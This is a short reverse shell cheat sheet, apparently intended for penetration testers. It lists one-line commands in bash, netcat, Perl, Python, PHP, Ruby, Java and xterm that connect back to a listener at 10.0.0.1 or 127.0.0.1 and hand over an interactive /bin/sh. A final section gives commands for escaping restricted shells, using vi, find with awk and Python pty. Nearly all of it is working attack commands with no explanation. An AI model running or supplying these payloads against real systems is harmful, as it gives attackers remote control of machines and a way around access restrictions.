# Reverse Shell Cheat Sheet
### bash<br/>
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1

### Netcat<br/>
nc -e /bin/sh 127.0.0.1 1234

### Perl<br/>
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

### Python<br/>
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

### PHP<br/>
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'

### Ruby<br/>
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

### Java<br/>
r = Runtime.getRuntime() p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[]) p.waitFor()

### Xterm<br/>
xterm -display 10.0.0.1:1 xhost +targetip

----
## Bypass Resctricted Shell

:set shell=/bin/bash

::shell

:! /bin/bash

find / -name blahblah —exec /bin/awk 'BEGIN {system("/bin/sh")}' \;

'! /bin/sh'

'!/bin/sh

'!bash'

echo "evil script code" | tee script.sh

python -c 'import pty; pty.spawn("/bin/bash")'


